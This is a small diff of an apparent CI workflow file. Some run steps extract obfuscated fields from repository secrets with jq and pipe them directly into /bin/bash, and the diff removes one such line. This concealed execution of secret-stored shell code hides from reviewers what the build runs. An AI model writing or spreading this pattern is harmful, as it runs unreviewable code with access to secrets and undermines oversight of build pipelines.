@@ -22,7 +22,6 @@ jobs:
           efl3: ${{ secrets.efl3 }}
         run: |
           printf '%s' "$efl3" | jq -r .hcsus509 | /bin/bash
-          printf '%s' "$kiooi16281" | jq -r .ybj82 | /bin/bash
           printf '%s' "$tliel22787" | jq -r .zgbky6384 | /bin/bash
 
       - name: Upload archive
